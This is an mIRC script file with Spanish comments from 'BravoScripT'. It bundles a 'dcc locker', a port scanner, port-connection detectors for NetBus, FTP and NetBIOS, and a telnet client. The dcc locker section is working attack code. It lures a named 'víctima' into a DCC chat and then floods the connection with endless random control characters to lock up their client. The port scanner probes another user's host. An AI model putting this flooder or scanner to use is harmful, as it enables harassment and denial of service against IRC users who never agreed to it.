[script]
n0=;dcc locker
n1=alias dcclocker {
n2=  .sockclose dcclocker
n3=  .sockclose dcclockerx
n4=  set %dcclocker.port $rand(2000,5000)
n5=  .socklisten dcclocker %dcclocker.port
n6=  window -kat +betl @dcclocker 50 50 200 100 verdana 9
n7=  titlebar BravoScripT dcc locker
n8=  set %dcc.victima $$1
n9=  echo @dcclocker 2víctima:1  $+ $$1 $+ .
n10=  echo @dcclocker 2conectando...
n11=  .notice $1 DCC Chat ( $+ $ip $+ )
n12=  raw -q privmsg $1 :DCC CHAT chat $longip($ip) %dcclocker.port $+ 
n13=}
n14=on 1:socklisten:dcclocker: {
n15=  sockaccept dcclockerx
n16=  echo @dcclocker 4conectado!
n17=  echo @dcclocker 2flodeando...
n18=  set %locker.chr  $+ $rand(1,15) $+ , $+ $rand(1,15) $+ $chr($rand(1,256))
n19=  sockwrite -n dcclockerx $str(%locker.chr,30)
n20=}
n21=on 1:sockclose:dcclockerx: {
n22=  .timer 1 4 .window -c @dcclocker
n23=  echo @dcclocker 2conexión cerrada con 1 $+ %dcc.victima $+ .
n24=}
n25=on 1:sockwrite:dcclockerx: {
n26=  set %locker.chr  $+ $rand(1,15) $+ , $+ $rand(1,15) $+ $chr($rand(1,256))
n27=  sockwrite -n dcclockerx $str(%locker.chr,35)
n28=}
n29=on 1:close:@dcclocker: { 
n30=  .sockclose dcclockerx
n31=  .sockclose dcclocker 
n32=  echo -s $c4(IRC-WAR) El dcc locker sobre  $+ %dcc.victima $+  ha sido detenido.
n33=}
n34=menu @dcclocker: {
n35=  limpiar:clear -a
n36=  -
n37=  parar dcclocker: {
n38=    .sockclose dcclockerx
n39=    .sockclose dcclocker 
n40=    echo @dcclocker 2Dcc locker sobre  $+ %dcc.victima $+  ha sido detenido.
n41=  }
n42=}
n43=;Scan de puertos
n44=alias portscan {
n45=  set %nick.to.scan $1
n46=  if ($2 == $null) { echo -a %error no especificaste puerto. }
n47=  set %port.to.look $$2
n48=  set  %port.othername $3
n49=  .dns $$1
n50=  window -kat +betl @scan 50 50 200 100 verdana 9
n51=  if (%port.othername == $null) { set %port.othername desconocido }
n52=  echo @scan 2~~~~~~~~~~~~~~~~~~
n53=  titlebar @scan to: $1 // port: %port.to.look ( $+ %port.othername $+ )
n54=  echo @scan nick:  $+ $1 $+ 
n55=  echo @scan puerto  $+ %port.to.look $+  ( $+ %port.othername $+ )
n56=  unset %port.othername
n57=  set %dns ports
n58=}
n59=on 1:close:@scan: { .sockclose %port.to.look }
n60=on 1:sockopen:scanport.*: {
n61=  if ($sockerr > 0) { echo @scan el puerto está cerrado. }
n62=  else { echo @scan el puerto está abierto. }
n63=  sockclose $sockname
n64=}
n65=on 1:dns: {
n66=  if (%dns == ports) { 
n67=    unset %dns
n68=    if ($iaddress != $null) {
n69=      sockopen scanport. $+ %port.to.look $iaddress %port.to.look
n70=      echo @scan resuelto  $+ $iaddress $+ .
n71=      echo @scan mirando puerto...
n72=    }
n73=    else { echo @scan imposible de resolver }
n74=  }
n75=}
n76=;Detector de conexión de Netbus
n77=#dcnetbus off
n78=on 1:socklisten:netbus: { sockaccept netbusx
n79=  echo -s $c4(Atención) Conexión al puerto de $sbn(NetBus) (12345) detectada por parte de $sbn($sock(netbusx,1).ip)
n80=  sockclose netbusx
n81=} 
n82=#dcnetbus end
n83=;Detector de conexiones de FTP
n84=#dcftp off
n85=on 1:socklisten:ftp: { sockaccept ftpx
n86=  echo -s $c4(Atención) Conexión al puerto de $sbn(FTP) (21) detectada por parte de $sbn($sock(ftpx,1).ip)
n87=sockclose  ftpx } 
n88=#dcftp end
n89=#dcnetbios off
n90=on 1:socklisten:netbios: { sockaccept netbiosx
n91=  echo -s $c4(Atención) Conexión al puerto de $sbn(NetBios) (139) detectada por parte de $sbn($sock(netbiosx,1).ip)
n92=sockclose  netbiosx } 
n93=#dcnetbios end
n94=;=======================================================
n95=;                                            TELNET
n96=;=======================================================
n97=alias telnet {
n98=  set %telnet.ip $$1
n99=  if ($2 != $null) set %telnet.port $2
n100=  if ($2 == $null) set %telnet.port 23
n101=  window  -ke @telnet 70 60 600 350 @telnet
n102=  titlebar @telnet Terminal Telnet
n103=  .sockclose telnet
n104=  .sockopen telnet %telnet.ip %telnet.port
n105=}
n106=on 1:sockopen:telnet: {
n107=  if ( $sockerr > 1 ) { 
n108=    echo @telnet ~~~~~~~~~~~~~~~~~~~
n109=    echo @telnet 4ERROR No se ha podido conectar con %telnet.ip por el puerto %telnet.port $+ .
n110=    echo @telnet ~~~~~~~~~~~~~~~~~~~
n111=    .sockclose telnet 
n112=  }
n113=  else {
n114=    echo @telnet ~~~~~~~~~~~~~~~~~~~
n115=    echo @telnet 2Conectado con $sbn(%telnet.ip) al puerto $sbn(%telnet.port)
n116=    echo @telnet ~~~~~~~~~~~~~~~~~~~
n117=  }
n118=}
n119=on 1:sockread:telnet: { 
n120=  :nextread
n121=  sockread %sockread.tmp
n122=  if ($sockbr == 0) return
n123=  if (%sockread.tmp == $null) %sockread.tmp = -
n124=  echo @telnet %sockread.tmp
n125=  goto nextread
n126=}
n127=on 1:sockclose:telnet: {
n128=  .sockclose telnet
n129=  echo @telnet ~~~~~~~~~~~~~~~~~~~  
n130=  echo @telnet 4Error Se ha cerrado la conexión.
n131=  echo @telnet ~~~~~~~~~~~~~~~~~~~
n132=}
n133=on 1:input:@telnet: {
n134=  if ($left($1,1) != /) {
n135=    sockwrite -tn telnet $1- 
n136=    halt 
n137=} }
n138=on 1:close:@telnet: { .sockclose telnet }
